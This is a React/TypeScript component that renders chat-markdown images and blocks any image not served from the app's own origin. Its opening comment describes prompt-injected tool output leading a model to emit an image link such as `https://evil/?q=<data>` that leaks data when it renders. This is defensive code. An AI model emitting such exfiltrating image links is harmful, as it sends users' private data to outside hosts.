import React from 'react';
import type { ExtraProps } from 'react-markdown';
import { ImageOff } from 'lucide-react';

// Chat markdown is model-written, and the model may have just read prompt-injected
// tool output. An image loads the moment it renders, so `![](https://evil/?q=<data>)`
// would hand what the model read to another host without anyone clicking. The CSP
// can't close this (widgets legitimately show images from anywhere), so the chat
// renderers only load images that never leave this app.
function isLocalImageSrc(src: string, origin: string = window.location.origin): boolean {
    const trimmed = src.trim();
    if (!trimmed) return false;
    if (/^(data|blob):/i.test(trimmed)) return true;
    try {
        return new URL(trimmed, origin).origin === origin;
    } catch {
        return false;
    }
}

function hostOf(src: string): string {
    try {
        return new URL(src, window.location.origin).host;
    } catch {
        return 'another site';
    }
}

export const ChatImage: React.FC<React.ComponentProps<'img'> & ExtraProps & { variant?: 'light' | 'dark' }> = ({
    src,
    alt,
    title,
    variant = 'light',
}) => {
    const url = typeof src === 'string' ? src : '';
    if (isLocalImageSrc(url)) return <img src={url} alt={alt} title={title} className="max-w-full" />;
    const tone = variant === 'dark' ? 'border-slate-600 text-slate-400' : 'border-gray-300 text-gray-500';
    return (
        <span
            className={`inline-flex items-center gap-1 rounded border border-dashed px-1.5 py-0.5 text-[11px] ${tone}`}
            title="Images from other sites aren't loaded in chat, so an answer can't send your data anywhere by showing one."
        >
            <ImageOff className="w-3 h-3 shrink-0" />
            {alt ? `${alt} — ` : ''}image from {hostOf(url)} not loaded
        </span>
    );
};

export const DarkChatImage: React.FC<React.ComponentProps<'img'> & ExtraProps> = props => (
    <ChatImage {...props} variant="dark" />
);
